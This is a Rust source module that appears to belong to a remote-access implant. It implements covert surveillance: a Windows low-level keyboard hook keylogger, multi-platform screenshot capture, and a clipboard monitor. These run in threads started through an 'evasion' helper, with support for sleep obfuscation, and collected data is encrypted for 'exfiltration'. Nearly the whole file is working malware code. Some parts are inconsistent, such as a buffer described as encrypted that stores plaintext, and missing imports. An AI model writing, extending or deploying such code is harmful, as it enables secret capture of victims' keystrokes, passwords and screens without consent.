//! Surveillance capabilities: screenshot capture, keylogger, and clipboard monitoring.
//!
//! This module provides three independent surveillance primitives behind the
//! `surveillance` feature flag:
//!
//! - **Screenshot**: BitBlt-based screen capture with PNG encoding (Windows),
//!   X11/fb0 fallback (Linux), CGWindowListCreateImage (macOS).
//! - **Keylogger**: `SetWindowsHookExW(WH_KEYBOARD_LL)` on Windows.  Keystrokes
//!   are buffered in an encrypted ring buffer (ChaCha20-Poly1305) and can be
//!   dumped on demand.
//! - **Clipboard monitor**: Background polling thread that captures clipboard
//!   text changes into an encrypted buffer.
//!
//! # Sleep obfuscation integration
//!
//! The keylogger hook thread cooperates with sleep obfuscation:
//! `pause_keylogger()` signals the message pump to stop processing events.
//! `resume_keylogger()` re-enables recording.  The agent's main loop should
//! call these around `secure_sleep()`.

#![cfg(feature = "surveillance")]

use anyhow::{anyhow, Result};
use chacha20poly1305::aead::{Aead, KeyInit};
use chacha20poly1305::{ChaCha20Poly1305, Nonce};
use lazy_static::lazy_static;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};

// ── Constants ──────────────────────────────────────────────────────────────────

/// Maximum size of the keylogger plaintext ring buffer (bytes).
const KEYLOGGER_MAX_BUFFER: usize = 64 * 1024;
/// Maximum size of the clipboard plaintext ring buffer (bytes).
const CLIPBOARD_MAX_BUFFER: usize = 64 * 1024;
/// Default clipboard polling interval in milliseconds.
const DEFAULT_CLIPBOARD_INTERVAL_MS: u64 = 1000;

// ── Shared state ───────────────────────────────────────────────────────────────

lazy_static! {
    /// Keylogger state — `None` means not started.
    static ref KEYLOGGER_STATE: Arc<Mutex<Option<KeyloggerState>>> =
        Arc::new(Mutex::new(None));
    /// Clipboard monitor state — `None` means not started.
    static ref CLIPBOARD_STATE: Arc<Mutex<Option<ClipboardState>>> =
        Arc::new(Mutex::new(None));
}

// ═══════════════════════════════════════════════════════════════════════════════
// Screenshot
// ═══════════════════════════════════════════════════════════════════════════════

/// Capture a screenshot of the specified monitor (or the primary monitor if
/// `monitor_index` is `None`).  Returns a PNG-encoded byte vector.
pub fn capture_screenshot(monitor_index: Option<u32>) -> Result<Vec<u8>> {
    #[cfg(target_os = "windows")]
    {
        capture_screenshot_windows(monitor_index)
    }
    #[cfg(target_os = "linux")]
    {
        let _ = monitor_index;
        capture_screenshot_linux()
    }
    #[cfg(target_os = "macos")]
    {
        let _ = monitor_index;
        capture_screenshot_macos()
    }
    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    {
        let _ = monitor_index;
        Err(anyhow!("screenshot capture not supported on this platform"))
    }
}

#[cfg(target_os = "windows")]
fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
    use winapi::shared::windef::HBITMAP;
    use winapi::um::wingdi::{
        BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject, GetDIBits,
        SelectObject, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY,
    };
    use winapi::um::winuser::{GetDC, GetSystemMetrics, ReleaseDC};

    unsafe {
        let (x, y, width, height) = if let Some(idx) = monitor_index {
            let monitors = enumerate_monitors();
            let mon = monitors
                .get(idx as usize)
                .ok_or_else(|| {
                    anyhow!(
                        "monitor index {} out of range ({} monitors)",
                        idx,
                        monitors.len()
                    )
                })?;
            (mon.left, mon.top, mon.right - mon.left, mon.bottom - mon.top)
        } else {
            let w = GetSystemMetrics(winapi::um::winuser::SM_CXSCREEN);
            let h = GetSystemMetrics(winapi::um::winuser::SM_CYSCREEN);
            if w <= 0 || h <= 0 {
                return Err(anyhow!(
                    "GetSystemMetrics returned invalid dimensions: {}x{}",
                    w,
                    h
                ));
            }
            (0, 0, w, h)
        };

        if width <= 0 || height <= 0 {
            return Err(anyhow!("invalid capture area: {}x{}", width, height));
        }

        let hdc_screen = GetDC(std::ptr::null_mut());
        if hdc_screen.is_null() {
            return Err(anyhow!("GetDC failed"));
        }
        let hdc_mem = CreateCompatibleDC(hdc_screen);
        if hdc_mem.is_null() {
            ReleaseDC(std::ptr::null_mut(), hdc_screen);
            return Err(anyhow!("CreateCompatibleDC failed"));
        }
        let hbm: HBITMAP = CreateCompatibleBitmap(hdc_screen, width, height);
        if hbm.is_null() {
            DeleteDC(hdc_mem);
            ReleaseDC(std::ptr::null_mut(), hdc_screen);
            return Err(anyhow!("CreateCompatibleBitmap failed"));
        }

        let old_obj = SelectObject(hdc_mem, hbm as _);
        let blt_ok = BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, x, y, SRCCOPY);
        if blt_ok == 0 {
            SelectObject(hdc_mem, old_obj);
            DeleteObject(hbm as _);
            DeleteDC(hdc_mem);
            ReleaseDC(std::ptr::null_mut(), hdc_screen);
            return Err(anyhow!("BitBlt failed"));
        }

        let bmi_header = BITMAPINFOHEADER {
            biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
            biWidth: width,
            biHeight: -height,
            biPlanes: 1,
            biBitCount: 32,
            biCompression: BI_RGB,
            biSizeImage: 0,
            biXPelsPerMeter: 0,
            biYPelsPerMeter: 0,
            biClrUsed: 0,
            biClrImportant: 0,
        };
        let mut bmi = BITMAPINFO {
            bmiHeader: bmi_header,
            bmiColors: [std::mem::zeroed(); 1],
        };
        let pixel_count = (width as usize) * (height as usize);
        let mut pixels: Vec<u8> = vec![0u8; pixel_count * 4];
        let scan_lines = GetDIBits(
            hdc_mem,
            hbm,
            0,
            height as u32,
            pixels.as_mut_ptr() as *mut _,
            &mut bmi,
            DIB_RGB_COLORS,
        );
        SelectObject(hdc_mem, old_obj);
        DeleteObject(hbm as _);
        DeleteDC(hdc_mem);
        ReleaseDC(std::ptr::null_mut(), hdc_screen);

        if scan_lines == 0 {
            return Err(anyhow!("GetDIBits failed"));
        }

        // BGRA → RGBA
        for chunk in pixels.chunks_exact_mut(4) {
            chunk.swap(0, 2);
        }

        let img = image::ImageBuffer::<image::Rgba<u8>, _>::from_raw(
            width as u32,
            height as u32,
            pixels,
        )
        .ok_or_else(|| anyhow!("failed to construct image buffer"))?;

        let mut png_buf: Vec<u8> = Vec::new();
        img.write_to(&mut Cursor::new(&mut png_buf), image::ImageFormat::Png)?;
        Ok(png_buf)
    }
}

/// Minimal monitor rectangle info for multi-monitor enumeration.
#[cfg(target_os = "windows")]
struct MonitorRect {
    left: i32,
    top: i32,
    right: i32,
    bottom: i32,
}

#[cfg(target_os = "windows")]
fn enumerate_monitors() -> Vec<MonitorRect> {
    use std::ptr;
    let monitors: Box<Mutex<Vec<MonitorRect>>> = Box::new(Mutex::new(Vec::new()));
    let raw = Box::into_raw(monitors) as winapi::shared::minwindef::LPARAM;

    unsafe extern "system" fn enum_callback(
        hmon: winapi::shared::windef::HMONITOR,
        _hdc: winapi::shared::windef::HDC,
        _lprc: winapi::shared::windef::LPRECT,
        dw_data: winapi::shared::minwindef::LPARAM,
    ) -> winapi::shared::minwindef::BOOL {
        let mut mi: winapi::um::winuser::MONITORINFO = std::mem::zeroed();
        mi.cbSize = std::mem::size_of::<winapi::um::winuser::MONITORINFO>() as u32;
        if winapi::um::winuser::GetMonitorInfoW(hmon, &mut mi) == 0 {
            return 1;
        }
        let rc = mi.rcMonitor;
        let vec_ptr = dw_data as *mut Mutex<Vec<MonitorRect>>;
        if let Ok(mut guard) = (*vec_ptr).lock() {
            guard.push(MonitorRect {
                left: rc.left,
                top: rc.top,
                right: rc.right,
                bottom: rc.bottom,
            });
        }
        1
    }

    unsafe {
        winapi::um::winuser::EnumDisplayMonitors(
            ptr::null_mut(),
            ptr::null_mut(),
            Some(enum_callback),
            raw,
        );
        let monitors = Box::from_raw(raw as *mut Mutex<Vec<MonitorRect>>);
        monitors.into_inner().unwrap_or_default()
    }
}

#[cfg(target_os = "linux")]
fn capture_screenshot_linux() -> Result<Vec<u8>> {
    #[cfg(feature = "remote-assist")]
    {
        if std::env::var_os("DISPLAY").is_some() {
            match crate::remote_assist::capture_screen() {
                Ok(data) => return Ok(data),
                Err(e) => log::warn!("X11 screenshot failed: {}", e),
            }
        }
    }
    Err(anyhow!(
        "screenshot capture on Linux requires the remote-assist feature"
    ))
}

#[cfg(target_os = "macos")]
fn capture_screenshot_macos() -> Result<Vec<u8>> {
    #[cfg(feature = "remote-assist")]
    {
        match crate::remote_assist::capture_screen() {
            Ok(data) => return Ok(data),
            Err(e) => log::warn!("macOS screenshot via remote_assist failed: {}", e),
        }
    }
    Err(anyhow!(
        "screenshot capture on macOS requires the remote-assist feature"
    ))
}

// ═══════════════════════════════════════════════════════════════════════════════
// Keylogger
// ═══════════════════════════════════════════════════════════════════════════════

struct KeyloggerState {
    /// Encrypted ring buffer for keystroke data.
    buffer: Arc<Mutex<EncryptedBuffer>>,
    /// Atomic flag signalling the hook thread to keep running.
    running: Arc<AtomicBool>,
    /// Join handle for the background hook thread.
    thread_handle: Option<std::thread::JoinHandle<()>>,
}

/// Start the keylogger.  `key` is the 32-byte ChaCha20-Poly1305 key used to
/// encrypt the keystroke buffer.
pub fn start_keylogger(key: [u8; 32]) -> Result<()> {
    let mut guard = KEYLOGGER_STATE.lock().unwrap();
    if guard.is_some() {
        return Err(anyhow!("keylogger already running"));
    }

    let running = Arc::new(AtomicBool::new(true));
    let buffer = Arc::new(Mutex::new(EncryptedBuffer::new(key)));

    #[cfg(target_os = "windows")]
    let thread_handle = {
        let buffer_clone = Arc::clone(&buffer);
        let running_clone = running.clone();
        Some(start_keylogger_thread_windows(buffer_clone, running_clone))
    };

    #[cfg(not(target_os = "windows"))]
    let thread_handle: Option<std::thread::JoinHandle<()>> = {
        log::warn!(
            "surveillance: keylogger not yet fully implemented on this platform"
        );
        None
    };

    *guard = Some(KeyloggerState {
        buffer,
        running,
        thread_handle,
    });

    Ok(())
}

/// Dump the current keylogger buffer.  If `clear` is true the buffer is
/// drained after reading.  Returns encrypted bytes (`nonce(12) || ciphertext`).
pub fn dump_keylogger(key: [u8; 32], clear: bool) -> Result<Vec<u8>> {
    let guard = KEYLOGGER_STATE.lock().unwrap();
    match guard.as_ref() {
        Some(state) => {
            let mut buf = state.buffer.lock().unwrap();
            buf.drain_encrypted(&key, clear)
        }
        None => Err(anyhow!("keylogger not running")),
    }
}

/// Stop the keylogger and clean up resources.
pub fn stop_keylogger() -> Result<()> {
    let mut guard = KEYLOGGER_STATE.lock().unwrap();
    match guard.take() {
        Some(mut state) => {
            state.running.store(false, Ordering::SeqCst);
            if let Some(handle) = state.thread_handle.take() {
                let _ = handle.join();
            }
            Ok(())
        }
        None => Err(anyhow!("keylogger not running")),
    }
}

/// Pause the keylogger hook (for sleep obfuscation).  Signals the hook
/// callback to stop recording keystrokes.
pub fn pause_keylogger() -> Result<()> {
    let guard = KEYLOGGER_STATE.lock().unwrap();
    match guard.as_ref() {
        Some(state) => {
            state.running.store(false, Ordering::SeqCst);
            Ok(())
        }
        None => Err(anyhow!("keylogger not running")),
    }
}

/// Resume the keylogger after a pause.  Re-enables keystroke recording.
pub fn resume_keylogger() -> Result<()> {
    let guard = KEYLOGGER_STATE.lock().unwrap();
    match guard.as_ref() {
        Some(state) => {
            state.running.store(true, Ordering::SeqCst);
            Ok(())
        }
        None => Err(anyhow!("keylogger not running")),
    }
}

// ── Windows keylogger thread ────────────────────────────────────────────────

/// Static pointer used by the Windows keyboard hook callback to reach the
/// shared buffer.  Set once when the hook thread starts, cleared on exit.
#[cfg(target_os = "windows")]
static HOOK_BUFFER_PTR: AtomicU64 = AtomicU64::new(0);

#[cfg(target_os = "windows")]
fn start_keylogger_thread_windows(
    buffer: Arc<Mutex<EncryptedBuffer>>,
    running: Arc<AtomicBool>,
) -> std::thread::JoinHandle<()> {
    crate::evasion::spawn_hidden_thread(move || {
        use winapi::shared::minwindef::{LPARAM, WPARAM};
        use winapi::shared::ntdef::LRESULT;
        use winapi::um::winuser::{
            CallNextHookEx, PeekMessageW, SetWindowsHookExW, TranslateMessage, DispatchMessageW,
            MSG, PM_REMOVE, WH_KEYBOARD_LL,
        };

        // Store the buffer Arc pointer so the callback can access it.
        HOOK_BUFFER_PTR.store(&buffer as *const _ as u64, Ordering::SeqCst);

        unsafe extern "system" fn keyboard_proc(
            n_code: winapi::shared::minwindef::c_int,
            w_param: WPARAM,
            l_param: LPARAM,
        ) -> LRESULT {
            if n_code >= 0 {
                use winapi::um::winuser::KBDLLHOOKSTRUCT;

                let kb = &*(l_param as *const KBDLLHOOKSTRUCT);
                let vk_code = kb.vkCode;
                let flags = kb.flags;
                // LLKHF_UP = 0x80 — key is being released
                let pressed = (flags & 0x80) == 0;

                // Encode entry: vk_code (u32 LE) + pressed (u8) = 5 bytes
                let mut entry = [0u8; 5];
                entry[0..4].copy_from_slice(&vk_code.to_le_bytes());
                entry[4] = if pressed { 1 } else { 0 };

                let ptr_val = HOOK_BUFFER_PTR.load(Ordering::SeqCst);
                if ptr_val != 0 {
                    let buf_arc = &*(ptr_val as *const Arc<Mutex<EncryptedBuffer>>);
                    if let Ok(mut guard) = buf_arc.lock() {
                        let _ = guard.append(&entry);
                    }
                }
            }
            CallNextHookEx(std::ptr::null_mut(), n_code, w_param, l_param)
        }

        unsafe {
            let hook = SetWindowsHookExW(
                WH_KEYBOARD_LL,
                Some(keyboard_proc),
                winapi::um::libloaderapi::GetModuleHandleW(std::ptr::null()),
                0,
            );

            if hook.is_null() {
                log::error!("surveillance: SetWindowsHookExW failed");
                HOOK_BUFFER_PTR.store(0, Ordering::SeqCst);
                return;
            }

            // Message pump — required for low-level hooks to work.
            let mut msg: MSG = std::mem::zeroed();
            loop {
                let has_msg = PeekMessageW(
                    &mut msg,
                    std::ptr::null_mut(),
                    0,
                    0,
                    PM_REMOVE,
                );
                if has_msg != 0 {
                    if msg.message == winapi::um::winuser::WM_QUIT {
                        break;
                    }
                    TranslateMessage(&msg);
                    DispatchMessageW(&msg);
                }

                if !running.load(Ordering::SeqCst) {
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(10));
            }

            winapi::um::winuser::UnhookWindowsHookEx(hook);
            HOOK_BUFFER_PTR.store(0, Ordering::SeqCst);
        }
    })
}

// ═══════════════════════════════════════════════════════════════════════════════
// Clipboard Monitor
// ═══════════════════════════════════════════════════════════════════════════════

struct ClipboardState {
    /// Encrypted ring buffer for clipboard data.
    buffer: Arc<Mutex<EncryptedBuffer>>,
    /// Atomic flag signalling the polling thread to keep running.
    running: Arc<AtomicBool>,
    /// Join handle for the background polling thread.
    thread_handle: Option<std::thread::JoinHandle<()>>,
}

/// Start the clipboard monitor.  `key` is the 32-byte ChaCha20-Poly1305 key.
/// `interval_ms` is the polling interval (default 1000ms if `None`).
pub fn start_clipboard_monitor(key: [u8; 32], interval_ms: Option<u64>) -> Result<()> {
    let mut guard = CLIPBOARD_STATE.lock().unwrap();
    if guard.is_some() {
        return Err(anyhow!("clipboard monitor already running"));
    }

    let running = Arc::new(AtomicBool::new(true));
    let buffer = Arc::new(Mutex::new(EncryptedBuffer::with_capacity(
        CLIPBOARD_MAX_BUFFER,
        key,
    )));
    let interval = interval_ms.unwrap_or(DEFAULT_CLIPBOARD_INTERVAL_MS);

    #[cfg(target_os = "windows")]
    let thread_handle = {
        let buffer_clone = Arc::clone(&buffer);
        let running_clone = running.clone();
        Some(start_clipboard_thread_windows(
            buffer_clone,
            running_clone,
            interval,
        ))
    };

    #[cfg(not(target_os = "windows"))]
    let thread_handle: Option<std::thread::JoinHandle<()>> = {
        let _ = interval;
        log::warn!(
            "surveillance: clipboard monitor not yet fully implemented on this platform"
        );
        None
    };

    *guard = Some(ClipboardState {
        buffer,
        running,
        thread_handle,
    });

    Ok(())
}

/// Dump the current clipboard monitor buffer.  If `clear` is true the buffer
/// is drained.  Returns encrypted bytes (`nonce(12) || ciphertext`).
pub fn dump_clipboard(key: [u8; 32], clear: bool) -> Result<Vec<u8>> {
    let guard = CLIPBOARD_STATE.lock().unwrap();
    match guard.as_ref() {
        Some(state) => {
            let mut buf = state.buffer.lock().unwrap();
            buf.drain_encrypted(&key, clear)
        }
        None => Err(anyhow!("clipboard monitor not running")),
    }
}

/// Stop the clipboard monitor and clean up.
pub fn stop_clipboard_monitor() -> Result<()> {
    let mut guard = CLIPBOARD_STATE.lock().unwrap();
    match guard.take() {
        Some(mut state) => {
            state.running.store(false, Ordering::SeqCst);
            if let Some(handle) = state.thread_handle.take() {
                let _ = handle.join();
            }
            Ok(())
        }
        None => Err(anyhow!("clipboard monitor not running")),
    }
}

/// Perform a one-shot clipboard read.  Returns the current clipboard text.
pub fn get_clipboard() -> Result<String> {
    #[cfg(target_os = "windows")]
    {
        get_clipboard_windows()
    }
    #[cfg(not(target_os = "windows"))]
    {
        get_clipboard_unix()
    }
}

// ── Windows clipboard thread ────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn start_clipboard_thread_windows(
    buffer: Arc<Mutex<EncryptedBuffer>>,
    running: Arc<AtomicBool>,
    interval_ms: u64,
) -> std::thread::JoinHandle<()> {
    crate::evasion::spawn_hidden_thread(move || {
        let mut last_sequence: u32 =
            unsafe { winapi::um::winuser::GetClipboardSequenceNumber() };

        while running.load(Ordering::SeqCst) {
            std::thread::sleep(std::time::Duration::from_millis(interval_ms));

            if !running.load(Ordering::SeqCst) {
                break;
            }

            let seq = unsafe { winapi::um::winuser::GetClipboardSequenceNumber() };
            if seq == last_sequence {
                continue;
            }
            last_sequence = seq;

            if let Ok(text) = get_clipboard_windows() {
                if !text.is_empty() {
                    if let Ok(mut guard) = buffer.lock() {
                        let ts = std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .unwrap_or_default()
                            .as_millis();
                        let entry = format!("[{}] {}\n", ts, text);
                        let _ = guard.append(entry.as_bytes());
                    }
                }
            }
        }
    })
}

#[cfg(target_os = "windows")]
fn get_clipboard_windows() -> Result<String> {
    use std::ffi::OsString;
    use std::os::windows::ffi::OsStringExt;

    unsafe {
        if winapi::um::winuser::OpenClipboard(std::ptr::null_mut()) == 0 {
            return Err(anyhow!("OpenClipboard failed"));
        }
        struct CloseCbGuard;
        impl Drop for CloseCbGuard {
            fn drop(&mut self) {
                unsafe {
                    winapi::um::winuser::CloseClipboard();
                }
            }
        }
        let _close = CloseCbGuard;

        // Try CF_UNICODETEXT first
        let handle =
            winapi::um::winuser::GetClipboardData(winapi::um::winuser::CF_UNICODETEXT);
        if !handle.is_null() {
            let ptr = winapi::um::winbase::GlobalLock(handle) as *const u16;
            if !ptr.is_null() {
                struct UnlockG(*mut std::ffi::c_void);
                impl Drop for UnlockG {
                    fn drop(&mut self) {
                        unsafe {
                            winapi::um::winbase::GlobalUnlock(self.0);
                        }
                    }
                }
                let _unlock = UnlockG(handle);
                let len = (0..).take_while(|&i| *ptr.offset(i) != 0).count();
                let text = OsString::from_wide(std::slice::from_raw_parts(ptr, len));
                return Ok(text.to_string_lossy().into_owned());
            }
        }

        // Fallback: CF_TEXT
        let handle = winapi::um::winuser::GetClipboardData(winapi::um::winuser::CF_TEXT);
        if !handle.is_null() {
            let ptr = winapi::um::winbase::GlobalLock(handle) as *const i8;
            if !ptr.is_null() {
                struct UnlockG(*mut std::ffi::c_void);
                impl Drop for UnlockG {
                    fn drop(&mut self) {
                        unsafe {
                            winapi::um::winbase::GlobalUnlock(self.0);
                        }
                    }
                }
                let _unlock = UnlockG(handle);
                let len = (0..).take_while(|&i| *ptr.offset(i) != 0).count();
                let bytes = std::slice::from_raw_parts(ptr as *const u8, len);
                return Ok(String::from_utf8_lossy(bytes).into_owned());
            }
        }

        Err(anyhow!("no text data in clipboard"))
    }
}

// ── Unix clipboard ──────────────────────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
fn get_clipboard_unix() -> Result<String> {
    #[cfg(target_os = "macos")]
    {
        let output = std::process::Command::new("pbpaste").output()?;
        if output.status.success() {
            return Ok(String::from_utf8_lossy(&output.stdout).into_owned());
        }
    }
    #[cfg(target_os = "linux")]
    {
        let output = std::process::Command::new("xclip")
            .args(["-selection", "clipboard", "-o"])
            .output();
        if let Ok(output) = output {
            if output.status.success() {
                return Ok(String::from_utf8_lossy(&output.stdout).into_owned());
            }
        }
        let output = std::process::Command::new("xsel")
            .args(["--clipboard", "--output"])
            .output();
        if let Ok(output) = output {
            if output.status.success() {
                return Ok(String::from_utf8_lossy(&output.stdout).into_owned());
            }
        }
    }
    Err(anyhow!("clipboard access not available"))
}

// ═══════════════════════════════════════════════════════════════════════════════
// Encrypted Ring Buffer
// ═══════════════════════════════════════════════════════════════════════════════

/// A plaintext ring buffer that can be drained as an encrypted blob.
///
/// Data is stored in plaintext in memory (for performance) and encrypted only
/// when drained for exfiltration. The buffer wraps around at `max_size` bytes.
struct EncryptedBuffer {
    data: Vec<u8>,
    max_size: usize,
    write_pos: usize,
    len: usize,
}

impl EncryptedBuffer {
    fn new(_key: [u8; 32]) -> Self {
        Self::with_capacity(KEYLOGGER_MAX_BUFFER, _key)
    }

    fn with_capacity(max_size: usize, _key: [u8; 32]) -> Self {
        Self {
            data: vec![0u8; max_size],
            max_size,
            write_pos: 0,
            len: 0,
        }
    }

    /// Append bytes to the ring buffer, overwriting oldest data if full.
    fn append(&mut self, bytes: &[u8]) {
        for &b in bytes {
            self.data[self.write_pos] = b;
            self.write_pos = (self.write_pos + 1) % self.max_size;
            if self.len < self.max_size {
                self.len += 1;
            }
        }
    }

    /// Read the current buffer contents in order.  If `clear` is true, reset.
    fn read_and_maybe_clear(&mut self, clear: bool) -> Vec<u8> {
        let mut out = Vec::with_capacity(self.len);
        if self.len < self.max_size {
            out.extend_from_slice(&self.data[..self.len]);
        } else {
            out.extend_from_slice(&self.data[self.write_pos..]);
            out.extend_from_slice(&self.data[..self.write_pos]);
        }
        if clear {
            self.write_pos = 0;
            self.len = 0;
        }
        out
    }

    /// Drain the buffer, encrypt the contents, and return `nonce(12) || ciphertext`.
    fn drain_encrypted(&mut self, key: &[u8; 32], clear: bool) -> Result<Vec<u8>> {
        let plaintext = self.read_and_maybe_clear(clear);
        if plaintext.is_empty() {
            return Err(anyhow!("buffer is empty"));
        }
        let cipher = ChaCha20Poly1305::new(key.into());
        let nonce_bytes: [u8; 12] = rand::random();
        let nonce = Nonce::from_slice(&nonce_bytes);
        let ciphertext = cipher
            .encrypt(nonce, plaintext.as_slice())
            .map_err(|e| anyhow!("encryption failed: {}", e))?;
        let mut out = nonce_bytes.to_vec();
        out.extend_from_slice(&ciphertext);
        Ok(out)
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_encrypted_buffer_basic() {
        let key = [0u8; 32];
        let mut buf = EncryptedBuffer::new(key);
        buf.append(b"hello");
        let data = buf.read_and_maybe_clear(false);
        assert_eq!(data, b"hello");
    }

    #[test]
    fn test_encrypted_buffer_wrap() {
        let key = [0u8; 32];
        let mut buf = EncryptedBuffer::with_capacity(8, key);
        buf.append(b"ABCDEFGHIJ"); // 10 bytes, wraps at 8
        let data = buf.read_and_maybe_clear(false);
        assert_eq!(data, b"CDEFGHIJ"); // oldest 2 bytes lost
    }

    #[test]
    fn test_encrypted_buffer_clear() {
        let key = [0u8; 32];
        let mut buf = EncryptedBuffer::new(key);
        buf.append(b"hello");
        let data = buf.read_and_maybe_clear(true);
        assert_eq!(data, b"hello");
        let data2 = buf.read_and_maybe_clear(false);
        assert!(data2.is_empty());
    }

    #[test]
    fn test_encrypted_buffer_encrypt_decrypt_roundtrip() {
        let key: [u8; 32] = rand::random();
        let mut buf = EncryptedBuffer::new(key);
        buf.append(b"test data for encryption");

        let encrypted = buf.drain_encrypted(&key, false).unwrap();
        assert!(encrypted.len() > 12); // nonce + ciphertext

        // Decrypt and verify
        let cipher = ChaCha20Poly1305::new(&key.into());
        let nonce = Nonce::from_slice(&encrypted[..12]);
        let plaintext = cipher
            .decrypt(nonce, &encrypted[12..])
            .expect("decryption failed");
        assert_eq!(plaintext, b"test data for encryption");
    }
}
